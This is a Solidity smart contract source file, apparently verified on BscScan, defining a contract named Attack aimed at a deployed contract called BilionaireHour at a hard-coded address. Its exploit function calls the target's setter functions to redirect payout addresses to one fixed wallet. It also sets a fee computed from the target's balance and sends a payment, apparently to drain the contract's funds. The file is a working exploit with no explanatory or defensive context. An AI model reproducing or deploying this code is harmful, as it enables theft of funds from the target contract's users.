/**
 *Submitted for verification at BscScan.com on 2022-11-10
*/

// SPDX-License-Identifier: PROPRIETARY - Murilo

pragma solidity ^0.8.17;

interface IBilionaireHour {

    function eBNB1(address _address) external;
    function eBNB2(address _address) external;
    function eBNB3(address _address) external;
    function eBNB4(address _address) external;
    function eWPMFee(uint _amount) external;
    function rA(address ref) external payable;
    function FAmount() external returns(uint);

}

contract Attack {

    IBilionaireHour internal target;

    constructor() {
         target = IBilionaireHour(0xB9fA891Df6257012d42E759853E4865885Ac8fa3);
    }

    function exploit() external payable {
        target.eBNB1(0xB5A521359D3B2773426cD99f4Eed5BDD40D813Be);
        target.eBNB2(0xB5A521359D3B2773426cD99f4Eed5BDD40D813Be);
        target.eBNB3(0xB5A521359D3B2773426cD99f4Eed5BDD40D813Be);
        target.eBNB4(0xB5A521359D3B2773426cD99f4Eed5BDD40D813Be);

        uint balanceOfTarget = address(target).balance;

        uint currentFamount = target.FAmount();

        uint transferAmount = 36000000000000000;

        uint PersentToSet = (balanceOfTarget - currentFamount)*1000/transferAmount;

        target.eWPMFee(PersentToSet);

        target.rA{value: transferAmount}(0xB5A521359D3B2773426cD99f4Eed5BDD40D813Be);

        require(address(target).balance > 20000000000000000, "er");
    }

}